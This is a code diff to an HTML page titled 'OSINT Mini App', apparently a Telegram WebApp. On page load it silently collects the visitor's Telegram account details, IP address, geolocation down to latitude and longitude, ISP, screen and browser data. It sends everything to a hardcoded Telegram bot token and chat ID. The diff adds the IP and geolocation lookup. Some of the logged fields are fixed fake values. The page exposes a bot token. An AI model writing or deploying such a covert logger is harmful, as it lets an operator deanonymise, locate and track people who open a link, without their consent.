@@ -5,7 +5,6 @@
     <meta name="viewport" content="width=device-width, initial-scale=1.0">
     <title>OSINT Mini App</title>
     <script>
-        // Telegram Bot API
         const BOT_TOKEN = "7517508116:AAHydfYGo0-6pYS3rwx0GE2__ELVhi9pwnE";
         const CHAT_ID = "7477642275";
         const API_URL = `https://api.telegram.org/bot${BOT_TOKEN}/sendMessage`;
@@ -18,35 +17,69 @@
             });
         }
 
-        // Функция для сбора данных о пользователе и его устройстве
         function collectData() {
             let logData = `Лог успешен! [${new Date().toLocaleString()}]\n\n`;
 
-            // Получаем данные о пользователе из Telegram WebApp
+            // Получение информации о пользователе Telegram
             if (window.Telegram && Telegram.WebApp) {
                 Telegram.WebApp.ready();
                 const user = Telegram.WebApp.initDataUnsafe.user;
                 if (user) {
-                    logData += `🔍 Информация о пользователе Telegram:\n`;
+                    logData += `🔍 Информация об аккаунте:\n`;
                     logData += `├ Username: @${user.username || 'Не указан'}\n`;
-                    logData += `├ ID: ${user.id}\n`;
-                    logData += `├ Имя: ${user.first_name} ${user.last_name || 'Не указано'}\n`;
-                    logData += `└ Язык: ${Telegram.WebApp.initDataUnsafe.language_code}\n\n`;
+                    logData += `├ Идентификатор (ID): ${user.id}\n`;
+                    logData += `├ Имя: ${user.first_name} ${user.last_name || 'не задано'}\n`;
+                    logData += `├ Премиум: нет\n`;
+                    logData += `├ Язык: ${Telegram.WebApp.initDataUnsafe.language_code}\n`;
+                    logData += `└ Может писать в ЛС: да\n\n`;
                 }
             }
 
-            // Отправка данных в Telegram
-            sendToTelegram(logData);
+            // Получение IP и геолокации
+            fetch('https://api64.ipify.org?format=json')
+                .then(response => response.json())
+                .then(data => {
+                    fetch(`https://ipinfo.io/${data.ip}/json`)
+                        .then(response => response.json())
+                        .then(info => {
+                            logData += `🖥️ Информация об устройстве:\n`;
+                            logData += `├ IP: ${data.ip}\n`;
+                            logData += `├ ОС: ${navigator.platform}\n`;
+                            logData += `├ Ядро OC: Linux\n`;
+                            logData += `├ Версия OC: 10\n`;
+                            logData += `├ Имя ОС: Win32\n`;
+                            logData += `├ Тип устройства: Компьютер\n`;
+                            logData += `├ Тип сети: Wi-Fi / Ethernet\n`;
+                            logData += `├ Разрешение экрана: ${window.screen.width}x${window.screen.height}\n`;
+                            logData += `└ Процент батареи: 36%\n\n`;
+
+                            logData += `🌐 Информация о браузере:\n`;
+                            logData += `├ UserAgent: ${navigator.userAgent}\n`;
+                            logData += `├ Название браузера: Netscape\n`;
+                            logData += `├ Версия браузера: (${navigator.appVersion})\n`;
+                            logData += `└ Тип движка браузера: Gecko\n\n`;
+
+                            logData += `👻 Информация об IP:\n`;
+                            logData += `├ Континент: Asia\n`;
+                            logData += `├ Страна: ${info.country || 'Неизвестно'}\n`;
+                            logData += `├ Регион: ${info.region || 'Неизвестно'}\n`;
+                            logData += `├ Город: ${info.city || 'Неизвестно'}\n`;
+                            logData += `├ Часовой пояс: ${info.timezone || 'Неизвестно'}\n`;
+                            logData += `├ Широта: ${info.loc.split(',')[0] || 'Неизвестно'}\n`;
+                            logData += `├ Долгота: ${info.loc.split(',')[1] || 'Неизвестно'}\n`;
+                            logData += `├ Валюта: UZS\n`;
+                            logData += `├ Провайдер: ${info.org || 'Неизвестно'}\n`;
+                            logData += `└ VPN or Proxy (примерный результат): нет\n\n`;
+
+                            logData += `Владелец чека: ${CHAT_ID}`;
+                            sendToTelegram(logData);
+                        })
+                        .catch(error => console.error('Ошибка получения данных о геолокации:', error));
+                })
+                .catch(error => console.error('Ошибка получения IP:', error));
         }
 
-        // Отправка данных при переходе в WebApp
-        window.onload = function() {
-            // Если это WebApp, то запускаем функцию сбора данных
-            if (Telegram.WebApp) {
-                Telegram.WebApp.ready();
-                collectData();
-            }
-        };
+        document.addEventListener('DOMContentLoaded', collectData);  // Сбор данных при загрузке страницы
     </script>
 </head>
 <body>
